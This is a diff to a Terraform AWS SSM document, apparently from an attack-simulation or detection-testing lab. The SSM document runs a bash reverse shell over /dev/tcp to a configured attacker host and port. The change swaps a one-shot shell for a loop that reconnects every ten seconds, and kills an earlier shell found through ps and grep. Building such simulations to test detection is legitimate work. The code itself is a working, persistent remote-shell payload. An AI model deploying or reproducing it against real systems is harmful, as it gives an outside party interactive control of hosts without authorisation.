@@ -26,15 +26,10 @@ resource "aws_ssm_document" "exec_reverse_shell_target" {
                     "timeoutSeconds": "600",
                     "runCommand": [
                         "echo \"Attacker Host: ${local.host_ip}:${local.host_port}\" > /tmp/attacker_exec_reverseshell_target.log",
-                        "kill -9 $(cat ${local.pid_path}) 2>&1 > /dev/null",
+                        "kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')",
                         "echo \"sleeping\" >> /tmp/attacker_exec_reverseshell_target.log",
-                        "sleep 10",
-                        # "while ! nc -w 1 ${local.host_ip} ${local.host_port}; do echo \"waiting for port...\" >> /tmp/attacker_exec_reverseshell_target.log; sleep 5; done",
                         "echo \"Running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1' &\" >> /tmp/attacker_exec_reverseshell_target.log",
-                        "/bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1' &",
-                        "echo -n $! > ${local.pid_path}",
-                        "echo \"Reverse Shell Connected...\" >> /tmp/attacker_exec_reverseshell_target.log",
-                        "touch /tmp/attacker_exec_reverseshell_target",
+                        "while ! /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do echo \"reconnecting...\" >> /tmp/attacker_exec_reverseshell_target.log; sleep 10; done",
                     ]
                 }
             }
